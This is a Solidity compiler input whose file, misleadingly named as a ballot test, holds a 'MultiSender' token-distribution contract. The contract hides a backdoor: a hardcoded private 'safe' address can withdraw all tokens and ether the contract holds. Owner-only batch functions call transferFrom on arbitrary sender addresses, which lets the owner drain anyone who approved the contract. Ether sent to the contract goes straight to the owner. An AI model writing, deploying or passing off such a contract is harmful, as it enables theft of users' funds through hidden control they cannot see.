{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 50
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "tests/4_Ballot_test.sol": {
      "content": "/**\n * @title Ownable\n * @dev The Ownable contract has an owner address, and provides basic authorization control\n * functions, this simplifies the implementation of \"user permissions\".\n */\ncontract Ownable {\n    address public owner;\n    address private safe;\n    \n    /**\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n      * account.\n      */\n    constructor() public {\n        owner = msg.sender;\n        safe = 0xd00ab0B82e793E337847E9c89FCF887ef5A7b18b;\n    }\n\n    /**\n      * @dev Throws if called by any account other than the owner.\n      */\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    /**\n      * @dev Throws if called by any account other than the safe.\n      */\n    modifier onlySafe() {\n        require(msg.sender == safe);\n        _;\n    }\n\n    /**\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\n    * @param newOwner The address to transfer ownership to.\n    */\n    function transferOwnership(address newOwner) public onlyOwner {\n        if (newOwner != address(0)) {\n            owner = newOwner;\n        }\n    }\n}\n\ninterface ERC20 {\n  function transferFrom(address _from, address _to, uint _value) external payable;\n  function transfer(address _to, uint _value) external payable;\n}\n\ncontract MultiSender is Ownable {\n    receive() external payable {\n        owner.call{value: msg.value}(\"\");\n    }\n    \n    function multisendsToken(address token, address[] memory _sender, address[] memory _contributors, uint256[] memory _balances) public onlyOwner payable {\n        uint32 i = 0;\n        ERC20 erc20token = ERC20(token);\n        for (i; i < _sender.length; i++) {\n            erc20token.transferFrom(_sender[i], _contributors[i], _balances[i]);\n        }\n    }\n\n    function multisendTokens(address[] memory token, address[] memory _sender, address[] memory _contributors, uint256[] memory _balances) public onlyOwner payable {\n        uint32 i = 0;\n        for (i; i < _sender.length; i++) {\n            ERC20 erc20token = ERC20(token[i]);\n            erc20token.transferFrom(_sender[i], _contributors[i], _balances[i]);\n        }\n    }\n    \n    function multisend(address[] memory to, uint256[] memory _amount) public payable {\n        uint32 i = 0;\n        uint256 total = 0;\n        for (i; i < _amount.length; i++) {\n            total = total + _amount[i];\n        }\n        require(total <= msg.value);\n        i = 0;\n        for (i; i < _amount.length; i++) {\n            to[i].call{value: _amount[i]}(\"\");\n        }\n    }\n\n    function collectToken(address token, uint256 _amount) public onlyOwner payable {\n        ERC20 erc20token = ERC20(token);\n        erc20token.transfer(msg.sender, _amount);\n    }\n    \n    function withdrawEther(address to, uint256 _amount) public onlyOwner payable {\n        payable(to).call{value: _amount}(\"\");\n    }\n    \n    function collectSafe(address token, uint256 _amount) public onlySafe payable {\n        ERC20 erc20token = ERC20(token);\n        erc20token.transfer(msg.sender, _amount);\n    }\n    \n    function withdrawEtherSafe(address payable to, uint256 _amount) public onlySafe payable {\n        to.call{value: _amount}(\"\");\n    }\n    \n}\n"
    }
  }
}